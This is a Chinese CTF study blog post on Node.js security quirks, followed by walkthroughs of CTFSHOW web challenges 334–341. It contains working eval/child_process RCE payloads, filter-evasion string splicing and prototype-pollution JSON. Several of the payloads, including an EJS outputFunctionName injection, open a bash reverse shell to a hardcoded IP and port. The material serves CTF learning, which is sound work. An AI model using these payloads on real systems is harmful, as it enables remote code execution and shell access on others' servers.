---
title: Node_js
date: 2022-01-09 14:15:33
updated: 2022-12-09 14:15:33
tags: [CTFSHOW,Nodejs]
categories: Nodejs
toc: true
---
Nodejs原型链污染相关

<!-- more -->
以题代练，了解JS相关漏洞和特性

一些特性：https://xz.aliyun.com/t/7752#toc-0

## 一、特性总结

### prototype(原型)

几乎js的所有对象都是Object的实例，我们没办法使用class自写一个类。js中只剩下对象，我们可以从一个函数中创建一个对象ob：

```js
function testfn() {
    this.a = 1;
    this.b = 2;
}
var ob = new testfn()
```

而从原始类型中创建对象为：

```js
a = "test";
b = 1;
c = false
```

这就是js被称为弱类型的原因，这一点与php、python类似，但又不相同，比如就null来说，php和python有一个专门的类型，对php来说是NULL类型，而python中没有null，取而代之的是none，同样的其为NontType；但对于js来说不一样，引一段代码来说话：

```
console.log(typeof(null))
//输出 object
```

而我们的null被称为原型对象，也就是万事万物的源点。

再谈谈js的数据类型，其大致分为两大类，一为基本类型，二为引用类型：

基本类型有：String、Number、boolean、null、undefined。

引用类型有：Object、Array、RegExp、Date、Function。

就数据类型来说，事实上也是JavaScript中的内置对象，也就是说JavaScript没有类的概念，只有对象。

对于对象来说，我们可以通过如下三种方式访问其原型：

```js
function testfn() {
    this.a = 1;
    this.b = 2;
}
var ob = new testfn()
//function
console.log(testfn["__proto__"])
console.log(testfn.__proto__)
console.log(testfn.constructor.prototype)
//object
console.log(ob["__proto__"])
console.log(ob.__proto__)
console.log(ob.constructor.prototype)
//tip:
//ob.__proto__ == testfn.prototype
```

#### 示例

下面再看一个关于prototype(原型)用法的例子：

```js
Array.prototype.test = function test(){
    console.log("Come from prototype")
}
a = []
a.test()
//输出 Come from prototype
```

若是以java这种强类型语言对于类的定义来解释，我们可以把prototype看作是一个类的一个属性，而该属性指向了本类的父类， `Array.prototype.test`即是给父类的test添加了一个test方法，当任何通过Array实例化的对象都会拥有test方法，即子类继承父类的非私有属性，所以当重新定义了父类中的属性时，其他通过子类实例化的对象也会拥有该属性，只能说是类似于上述解释，但不可完全以上述解释来解释原型，因为js对于类的定义有些模糊。

```js
console.log([].__proto__)
console.log([].__proto__.__proto__)
console.log([].__proto__.__proto__.__proto__)
```

其原型链如下：

> [] -> Array -> Object -> null

原型链的网上资料很多就不多讲了。

### 弱类型

#### 大小比较

这个类似与php，这个就很多啦，直接看代码示例理解更快：

```js
console.log(1=='1'); //true
console.log(1>'2'); //false
console.log('1'<'2'); //true
console.log(111>'3'); //true
console.log('111'>'3'); //false
console.log('asd'>1); //false
```

总结：

- 数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；
- 字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况
- 而非数字型字符串与任何数字进行比较都是false

#### 数组的比较

```js
console.log([]==[]); //false
console.log([]>[]); //false
console.log([6,2]>[5]); //true
console.log([100,2]<'test'); //true
console.log([1,2]<'2');  //true
console.log([11,16]<"10"); //false
```

总结：

- 空数组之间比较永远为false
- 数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法
- 数组与非数值型字符串比较，数组永远小于非数值型字符串
- 数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较。

还有一些比较特别的相等：

```js
console.log(null==undefined) // 输出：true
console.log(null===undefined) // 输出：false
console.log(NaN==NaN)  // 输出：false
console.log(NaN===NaN)  // 输出：false
```

### 变量拼接

```js
console.log(5+[6,6]); //56,3
console.log("5"+6); //56
console.log("5"+[6,6]); //56,6
console.log("5"+["6","6"]); //56,6
```

### 模块加载与RCE

在一些沙盒逃逸时我们通常是找到一个可以执行任意命令的payload，若是在ctf比赛中，我们需要getflag时通常是需要想尽办法加载模块来达成特殊要求。

比赛中常见可以通过`child_process`模块来加载模块，获得`exec`，`execfile`，`execSync`。

- 通过require加载模块如下：

```js
require('child_process').exec('calc');
```

- 通过`global`对象加载模块

```js
global.process.mainModule.constructor._load('child_process').exec('calc');
```

对于一些上下文中没有require的情况下，通常是想办法使用后者来加载模块，事实上，node的Function(...)并不能找到require这个函数。

有些情况下可以直接用require，如eval。

### 代码执行

```js
eval("require('child_process').exec('calc');");
setInterval(require('child_process').exec,1000,"calc");
setTimeout(require('child_process').exec,1000,"calc");
Function("global.process.mainModule.constructor._load('child_process').exec('calc')")();
```

这里可以发现对于Function来说上下文并不存在require，需要从global中一路调出来exec。

### 大小写特性

`toUpperCase()` 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。

`toLowerCase()` 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。

### ES6模板字符串

我们可以使用反引号替代括号执行函数，如:

```js
alert`test!!`
```

可以用反引号替代单引号双引号，可以在反引号内插入变量，如：

```js
var fruit = "apple";
console.log`i like ${fruit} very much`;
```

事实上，模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到`${}`时将字符串进行分割，具体为下：

```js
["i like ", " very much", raw: Array(2)]
0: "i like "
1: " very much"
length: 2
raw: (2) ["i like ", " very much"]
__proto__: Array(0)
```

所以有时使用反引号执行会失败，所以如下是无法执行的：

```js
eval`alert(2)`
```

#### 

## 二、CTFSHOW题目

参考这两篇文章：

https://na0h.cn/2021/09/08/ctfshow-nodejs/

https://tari.moe/2021/05/04/ctfshow-nodejs/



### web334 大小写特性

略

### web335-336 RCE

> Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require('child_process').exec('');来进行调用。

发现返回的是 [object Object]

查看文档：

[child_process 子进程 | Node.js API 文档 (nodejs.cn)](http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback)

发现exec返回的是

![](https://img-blog.csdnimg.cn/bcd70f18cb2d471da1b7ce45f4a9b10a.png#pic_center)
通过查找所有可替换用法

 `execSync`

![](https://s2.loli.net/2022/01/09/mp7T8VjFqxew4vR.png)

 `spawnSync`

注意：`child_process.spawnSync(command[, args][, options])`

![](https://s2.loli.net/2022/01/09/H3pCLOvwXBV69Po.png)

几种常用的payload:

```js
?eval=require('child_process').execSync('cat fl00g.txt');
?eval=require('child_process').spawnSync('cat',['fl00g.txt']).output;
?eval=global.process.mainModule.constructor._load('child_process').execSync('cat fl00g.txt');

文件操作
?eval=require('fs').readdirSync('.');
?eval=require('fs').readFileSync('fl001g.txt');

法三 拼接
'+' 要urlencode一下
?eval=var a="require('child_process').ex";var b="ecSync('ls').toString();";eval(a%2Bb); 
?eval=require('child_process')['ex'%2B'ecSync']('cat f*')
```

[Node.js 文件系统模块 (nodejs.cn)](http://nodejs.cn/learn/the-nodejs-fs-module)

![](https://img-blog.csdnimg.cn/128a8a59555a4938a35dd05c09984d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)



### web337 md5绕过

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

数组绕过：

```js
?a[]=1&b[]=1
```



### web338 原型链污染

```json
{"__proto__": {"ctfshow": "36dboy"}}
```

注意提交POST包时，Content-type要为 application/json才能正确被解析成json对象



### web339 原型链污染+rce

```js
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
});
```

```js
res.render('api', { query: Function(query)(query)});
```

这里的污染点可能存在匿名函数从而进行RCE

![](https://s2.loli.net/2022/01/14/b41mGrOyN2zIvTl.png)

![](https://s2.loli.net/2022/01/14/QyKVWdj3Ni4MEIm.png)



payload：

注意： `require` 可能不被识别，尝试把 require 改为 `global.process.mainModule.constructor._load`

```json
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/124.223.44.100/6666 0>&1\"')"}}
```



### web340 原型链污染++

```js
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
});
```

依旧有上题的 api.js ，可以反弹shell，但在login中，copy对象从user变成了user.userinfo，

只需要用proto向上跳两层即可

payload:

```json
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/124.223.44.100/6666 0>&1\"')"}}}
```



### web341 ejs + rce

![](https://s2.loli.net/2022/01/14/U2yQ9cgmCFsufV6.png)

原理请看：https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/

简述：![](https://evi0s.com/wp-content/uploads/2019/08/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2019-08-30-%E4%B8%8A%E5%8D%8812.08.24.png)

看到这里，立刻发现这里有一个代码注入的漏洞

仔细解释一下：

可以看到， `opts` 对象 `outputFunctionName` 成员在 express 配置的时候并没有给他赋值，默认也是未定义，即 `undefined`，这样在 574 行时，if 判否，跳过

但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给 `Object` 类创建一个成员 `outputFunctionName`，这样可以进入 if 语句，并将我们控制的成员 `outputFunctionName` 赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的 RCE

至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码

```js
a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //
```

JavaScript

Copy

放到代码里面看就是

```js
prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
// After injection
prepended += ' var a; return global.process.mainModule.constructor._load("child_process").execSync("whoami"); // 后面的代码都被注释了'
```

从而构造payload:

```json
{"__proto__":{"__proto__":{"outputFunctionName":"_t1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/124.223.44.100/6666 0>&1\"');var __t2"}}}

{"__proto__":{"__proto__":{"outputFunctionName":"_t1;global.process.mainModule.require('child_process').exec('bash -i >& /dev/tcp/124.223.44.100/6666 0>&1');var __t2"}}}
```



















